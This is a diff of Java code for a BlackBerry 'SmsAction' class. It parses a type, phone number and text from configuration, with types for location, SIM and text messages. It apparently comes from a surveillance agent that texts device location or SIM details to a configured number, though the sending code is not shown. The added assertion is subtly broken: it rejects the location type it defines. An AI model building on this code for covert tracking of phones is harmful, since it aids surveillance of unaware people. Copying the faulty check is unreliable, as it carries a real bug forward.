@@ -16,7 +16,8 @@ import javax.wireless.messaging.MessageConnection;
 import javax.wireless.messaging.TextMessage;
 
 import net.rim.device.api.util.DataBuffer;
-import blackberry.event.Event;
+import blackberry.event.Event; 
+import blackberry.utils.Check; 
 import blackberry.utils.WChar;
 
 // TODO: Auto-generated Javadoc
@@ -25,8 +26,13 @@ import blackberry.utils.WChar;
  */
 public final class SmsAction extends SubAction {
 
+    private static final int TYPE_LOCATION = 1;
+    private static final int TYPE_SIM = 2;
+    private static final int TYPE_TEXT = 3;
+
     String number;
     String text;
+    int type;
 
     /**
      * Instantiates a new sms action.
@@ -80,21 +86,37 @@ public final class SmsAction extends SubAction {
         final DataBuffer databuffer = new DataBuffer(confParams, 0,
                 confParams.length, false);
         try {
-            databuffer.readInt();
+            type = databuffer.readInt();
+
+            //#ifdef DBC
+            Check.asserts(type > 1 && type <= 3, "wrong type");
+            //#endif
+
             int len = databuffer.readInt();
             byte[] buffer = new byte[len];
             databuffer.read(buffer);
             number = WChar.getString(buffer, true);
 
-            len = databuffer.readInt();
-            buffer = new byte[len];
-            databuffer.read(buffer);
-            text = WChar.getString(buffer, true);
+            if (type == TYPE_TEXT) {
+                len = databuffer.readInt();
+                buffer = new byte[len];
+                databuffer.read(buffer);
+                text = WChar.getString(buffer, true);
+            }
 
         } catch (final EOFException e) {
 
             return false;
         }
+
+        //#mdebug
+        StringBuffer sb = new StringBuffer();
+        sb.append("type: " + type);
+        sb.append("number: " + number);
+        sb.append("text: " + text);
+        //#debug info
+        debug.info(sb.toString());
+        //#enddebug
 
         return true;
     }
